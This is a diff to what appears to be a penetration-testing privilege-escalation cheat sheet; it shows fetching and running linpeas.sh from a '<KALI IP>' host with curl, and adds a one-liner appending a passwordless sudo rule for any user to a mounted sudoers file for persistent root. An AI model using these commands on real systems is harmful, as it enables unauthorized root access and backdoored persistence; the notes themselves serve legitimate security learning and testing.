@@ -22,6 +22,13 @@ curl --output linpeas.sh http://<KALI IP>:8080/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
 ```
+## Quick privesc
+If you can execute as root, below is a simple onliner to get permanent privesc
+```
+# Add any other user to sudoers
+echo '<username> ALL=(ALL) NOPASSWD:ALL' >> /mnt/root/etc/sudoers
+```
+
 ## Basic
 Check if you can become root without password
 ```
